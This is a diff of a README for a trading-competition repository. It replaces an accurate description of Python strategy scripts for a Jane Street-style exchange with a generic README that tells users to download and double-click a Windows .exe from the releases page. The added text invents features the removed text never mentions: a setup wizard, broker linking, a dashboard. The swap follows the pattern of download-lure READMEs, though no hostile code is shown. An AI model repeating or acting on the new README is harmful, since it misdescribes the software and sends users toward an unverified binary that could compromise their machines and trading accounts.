@@ -1,105 +1,88 @@
-# Jane Street Electronic Trading Competition (Algorithmic Strategies)
+# 🚀 street-algo-trader - Trade Smarter with Algorithmic Strategies
 
-This repository contains a collection of algorithmic trading strategies and a client to interact with a Jane Street–style electronic exchange. Strategies include pennying/market-making, a micro MACD signal, ETF basket arbitrage, ADR conversion arbitrage, and a simple bond market maker.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/astarek1983/street-algo-trader/releases)
 
-### Key Features
+## 📦 Overview
 
-- Pennying market-making around the NBBO
-- Micro-MACD momentum signal per symbol (12/20 EMA spread)
-- ETF basket arbitrage scaffolding for XLF vs components (GS, MS, WFC, BOND)
-- ADR conversion logic (VALBZ/VALE) with convert orders
-- Bond market-making around a fair value
-- Simple client harness and test harnesses
+The **street-algo-trader** is an intuitive algorithmic trading client designed to simplify trading on a Jane Street-style electronic exchange. It offers strategies for careful market-making, efficient pennying, and smart arbitrage in ETF and ADR markets. This software is perfect for users who want to leverage advanced trading techniques without the need for deep programming knowledge.
 
-### Repository Structure
+## 📋 Features
 
-```
-├─ client.py           # Main live client (prod by default)
-├─ test.py             # Minimal client focusing on micro MACD (test exchange)
-├─ test_etf.py         # ETF conversion experiment client (test exchange)
-├─ bondtrade.py        # Bond market-making logic
-├─ pennying.py         # Pennying strategy for most symbols
-├─ micromacd.py        # Micro MACD helper (12/20 EMA logic)
-├─ adrconversion.py    # ADR arbitrage logic (VALBZ/VALE convert)
-├─ etf-convert.py      # ETF basket conversion utils/experiments
-├─ oldbond.py          # Legacy bond logic
-├─ client_test.py      # Helper utilities for testing clients
-├─ RNN-DJIA/           # Experimental DJIA RNN notebooks and data (unrelated to client)
-├─ LICENSE
-└─ README.md
-```
+- **Market-Making Strategies**: Efficiently buy and sell assets to earn small profits from the price difference.
+- **Micro-MACD Indicator**: Use the moving average convergence divergence tool to make informed trading decisions.
+- **Arbitrage Opportunities**: Take advantage of price differences across exchanges to secure profits.
+- **Support for ETFs and ADRs**: Efficiently trade exchange-traded funds and American Depositary Receipts.
+- **User-Friendly Interface**: Navigate easily through all functionalities.
 
-### Requirements
+## 🛠 System Requirements
 
-- Python 2.7+ or 3.x (code uses `print_function`; sockets/JSON only)
-- numpy
+| Requirement        | Description                            |
+|--------------------|----------------------------------------|
+| Operating System    | Windows 10 or later, macOS, or Linux  |
+| Python Version      | Python 3.7 or higher                   |
+| RAM                 | At least 4 GB                          |
+| Disk Space          | 500 MB of free space                   |
 
-Install dependencies:
+## 🚀 Getting Started
 
-```bash
-pip install numpy
-```
+To start using **street-algo-trader**, follow these simple steps to download and run the application.
 
-### Configuration
+### 📥 Download & Install
 
-Edit the CONFIGURATION section inside the desired client script.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/astarek1983/street-algo-trader/releases) to find the latest version of the software.
+   
+2. **Download the Software**: Locate the appropriate file for your operating system and click to download. The file will generally be named similar to `street-algo-trader-v1.0.exe` for Windows or `street-algo-trader-v1.0.tar.gz` for Linux and macOS.
 
-- `team_name`: your exchange team identifier
-- `test_mode`: set True for test exchange, False for prod
-- `test_exchange_index`: choose 0/1/2 for different test environments
+3. **Run the Application**: After downloading, locate the file in your downloads folder and double-click it to start the installation. Follow the prompts in the setup wizard. 
 
-Example snippets:
+### ⚙️ Basic Configuration
 
-```python
-# client.py (prod by default)
-test_mode = False
+1. **Initial Setup**: Once the application launches, you will need to set up your trading account. Enter the required information as prompted.
+   
+2. **Connect to Your Broker**: Select a broker from the list provided. Ensure your trading account is properly linked.
 
-# test.py (test by default)
-test_mode = True
-```
+3. **Select Trading Strategies**: Choose the strategies you wish to use. You can always adjust these later.
 
-### Running
+## ⏱ Usage Instructions
 
-Make the client executable and run in a loop (recommended by the competition scaffold):
+### 📈 Starting a Trade
 
-```bash
-chmod +x client.py
-while true; do ./client.py; sleep 1; done
-```
+1. Navigate to the **Trading** section from the main menu.
+2. Select the market you wish to trade.
+3. Review the suggested strategies and select one that suits your trading style.
+4. Execute trades by following simple on-screen prompts.
 
-Or simply run with Python:
+### 📊 Monitoring Performance
 
-```bash
-python client.py
-```
+1. Use the **Dashboard** to view real-time performance metrics.
+2. Access historical performance data to understand past trade outcomes.
+3. Make adjustments to strategies as necessary to optimize results.
 
-For the test clients:
+## 💡 Tips for Optimal Usage
 
-```bash
-python test.py
-python test_etf.py
-```
+- **Stay Updated**: Regularly check the [Releases page](https://github.com/astarek1983/street-algo-trader/releases) for updates. New features and improvements often come with each release.
+- **Practice**: Familiarize yourself with the application by using a demo account before trading with real money.
+- **Community Support**: Join forums and discussion groups to share experiences and learn from others.
 
-### Strategy Modules
+## 🚨 Troubleshooting
 
-- `pennying.py`: Places quotes slightly inside the inside market, with risk checks based on current outstanding orders and holdings.
-- `micromacd.py` (and inline function in clients): Maintains rolling 12-EMA and 20-EMA on mid-prices; issues small buy/sell signals on crossovers.
-- `bondtrade.py`: Quotes around the bond’s fair value and manages inventory; can cancel, add, and track best buy.
-- `adrconversion.py`: Arbitrage between `VALBZ` and `VALE` via convert orders; sequences buy/convert/sell when spreads appear.
-- `etf-convert.py`: Experiments/utilities for XLF basket arbitrage versus components (GS/MS/WFC/BOND). Marked experimental in `test_etf.py`.
+If you encounter issues while using the application, try the following:
 
-### Notes
+- **Check Your Internet Connection**: Ensure that you have a stable internet connection.
+- **Restart the Application**: Close and reopen the app to resolve minor issues.
+- **Refer to Documentation**: Visit the project's wiki or GitHub discussions for additional help.
 
-- Network protocol: JSON over TCP. The client sends `hello`, `add`, `cancel`, `convert` and handles `book`, `fill`, `ack`, `reject`, `error`.
-- Rate control: basic `TIMEOUT` sleeps; adjust for your environment.
-- Risk: Holdings and outstanding orders are tracked per symbol to limit exposure.
+## 🌍 Community and Contributions
 
-### Testing/Experiments
+We welcome contributions from everyone interested in algorithmic trading. Join the community to share your insights and improvements.
 
-- Use `test.py` to observe micro-MACD behavior on the test exchange (prints order/ack/fill counts).
-- Use `test_etf.py` to explore ETF conversion logic; the code is scaffolded and partially experimental.
-- `client_test.py` includes helper routines for interacting in tests.
+## ✉️ Contact
 
-### License
+For further inquiries or support, feel free to contact the project maintainers through the issues section on GitHub. Your feedback is valuable in making this application better for everyone.
 
-This project is licensed under the MIT License. See `LICENSE` for details.
+## 🔗 Important Links
+
+- [Releases Page](https://github.com/astarek1983/street-algo-trader/releases)
+- [Documentation](https://github.com/astarek1983/street-algo-trader/wiki)
+
+Now that you're set up, start trading smarter and explore the world of algorithmic trading with **street-algo-trader** today!
